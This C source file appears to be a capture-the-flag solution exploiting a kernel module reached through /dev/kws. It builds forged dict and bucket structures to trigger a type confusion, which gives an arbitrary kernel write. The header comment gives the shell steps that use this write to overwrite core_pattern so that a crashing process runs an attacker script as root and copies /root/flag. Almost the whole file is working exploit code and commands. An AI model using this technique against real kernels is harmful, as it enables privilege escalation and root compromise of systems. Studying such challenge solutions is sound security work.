#include <stdio.h>
#include <fcntl.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/types.h>


/*

$ cat /proc/kallsyms | grep core_pattern
ffffffff8162c7b0 D core_pattern

$ echo -e '#!/bin/sh\n\ncp /root/flag /tmp/flag; chmod 777 /tmp/flag' > /tmp/a
$ chmod +x /tmp/a

$ ./a.out 0x6d742f7c 0xffffffff8162c7b0
$ ./a.out 0x612f70 0xffffffff8162c7b4
$ ./a.out

 */

int main(int argc, char** argv) {
    if (argc != 3) {
        char* a = 0;
        *a = 0;
    }
        
    uint64_t what = strtoul(argv[1], NULL, 0);
    uint64_t where = strtoul(argv[2], NULL, 0);

    mmap(what&(~0xfff), 0x1000, 7, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0);
    void* fakeBucket1 = mmap(0x000320c001c000, 0x1000, 7, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0);

    // This is the key for the dict. By making it type "dict", we cause a type confusion
    // allowing us to make the kernel module think the string is a table of buckets
    void* key = malloc(0x1000);
    void* type = malloc(0x20);
    //*(char**)(type+0x18) = "str";
    *(char**)(type+0x18) = "dict";
    *(void**)(key+8) = type;

    // All buckets should be empty. The first will not be because of the magic cookie in the string
    *(uint64_t*)(key+0x10) = 100*8;
    for (int i=1; i<=100; i++) {
        ((uint64_t*)(key+0x24))[i-1] = 0;
    }

    // To deal with the cookie, we just make it an empty bucket
    void* bucket0 = 0x00000320c001cafe;
    *(size_t*)(bucket0) = 0;
    *(void**)(bucket0+0x8) = bucket0;

    // This is our fake bucket that points to our write.
    // when the back pointer is created, we will write this address
    // to the where pointer
    void* bucket1 = what;
    *(size_t*)(bucket1) = 1;
    //*(void**)(bucket1+0x8) = 0x4242424242424242;
    *(void**)(bucket1+0x8) = where;

    // Put the bucket into some hash spot
    //((uint64_t*)(key+0x24))[0] = 0x4141414141414141;
    ((uint64_t*)(key+0x24))[0] = bucket1;




    // This is the value, it doesn't really matter, it just has to exist and be valid
    void* val = malloc(0x100);
    type = malloc(0x20);
    *(char**)(type+0x18) = "int";
    *(void**)(val+8) = type;

    *(uint64_t*)(val+0x10) = 0x4142434445464748;



    // This is the dict that has the key value pair
    void* dict = malloc(0x100);
    type = malloc(0x20);
    *(char**)(type+0x18) = "dict";
    *(void**)(dict+8) = type;

    *(uint64_t*)(dict+0x20) = 0;

    void** table = malloc(8*3);
    *(void***)(dict+0x28) = table; 
    table[1] = key;
    table[2] = val;

    

    // Send the dict to the server
    int fd = open("/dev/kws",O_RDWR,0);

    void* arg[2];
    arg[0] = val; // Just need some key
    arg[1] = dict;
    int ret = ioctl(fd, 1, arg);
    printf("Result = %d\n",ret);
}
